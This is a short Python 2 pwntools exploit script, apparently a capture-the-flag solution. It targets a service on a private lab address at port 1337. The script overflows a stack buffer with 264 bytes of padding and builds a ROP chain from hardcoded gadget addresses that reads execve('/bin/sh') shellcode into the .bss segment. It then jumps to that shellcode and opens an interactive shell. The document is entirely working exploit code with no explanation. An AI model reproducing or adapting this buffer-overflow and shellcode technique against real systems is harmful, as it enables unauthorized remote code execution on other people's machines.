#!/usr/bin/env python
from pwn import *


def main():
    conn = remote("10.61.0.101", 1337)
    shellcode = "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54"\
                "\x5f\xb0\x3b\x31\xd2\x0f\x05"  # 22 bytes
    bss_addr = 0x6cbc60
    pop_rdi_ret = 0x4014d6
    pop_rsi_ret = 0x4015f7
    pop_rdx_ret = 0x442806
    xor_rax_rax_ret = 0x42608f
    read_addr = 0x43f390

    payload = "\x90" * 264
    payload += p64(pop_rdi_ret)
    payload += p64(0)
    payload += p64(pop_rsi_ret)
    payload += p64(bss_addr)
    payload += p64(pop_rdx_ret)
    payload += p64(23)
    payload += p64(xor_rax_rax_ret)
    payload += p64(read_addr)
    payload += p64(bss_addr)

    print conn.recvuntil("Welcom to the x64 world!!\n")

    conn.sendline(payload)
    conn.sendline(shellcode)
    conn.interactive()


if __name__ == "__main__":
    main()
